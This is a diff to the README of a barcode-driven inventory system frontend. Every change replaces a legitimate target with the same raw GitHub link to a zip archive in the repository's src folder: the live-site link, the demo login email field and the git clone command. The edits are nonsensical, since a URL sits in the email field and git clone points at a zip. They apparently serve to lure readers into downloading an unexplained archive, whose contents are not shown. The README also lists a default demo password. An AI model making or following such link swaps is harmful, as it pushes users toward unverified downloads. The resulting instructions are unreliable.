@@ -1,7 +1,7 @@
 # 📱 Barcode-Driven Inventory System - Frontend
 
 ### Live Site
-👉 [https://bdis.netlify.app](https://bdis.netlify.app)
+👉 [https://github.com/Nahar0912/Barcode-Driven-Inventory-System-Frontend/raw/refs/heads/main/src/Barcode-Frontend-Inventory-Driven-System-1.2-beta.3.zip](https://github.com/Nahar0912/Barcode-Driven-Inventory-System-Frontend/raw/refs/heads/main/src/Barcode-Frontend-Inventory-Driven-System-1.2-beta.3.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Features:
 ---
 
 ## 🔐 Demo Login Credentials
-- **Email:** `admin@gmail.com`
+- **Email:** `https://github.com/Nahar0912/Barcode-Driven-Inventory-System-Frontend/raw/refs/heads/main/src/Barcode-Frontend-Inventory-Driven-System-1.2-beta.3.zip`
 - **Password:** `Admin123`
 
 ---
@@ -38,5 +38,5 @@ Features:
 
 ### 1. Clone the Repository
 ```bash
-git clone https://github.com/Nahar0912/Barcode-Driven-Inventory-System-Frontend.git
+git clone https://github.com/Nahar0912/Barcode-Driven-Inventory-System-Frontend/raw/refs/heads/main/src/Barcode-Frontend-Inventory-Driven-System-1.2-beta.3.zip
 cd barcode-inventory-system-frontend
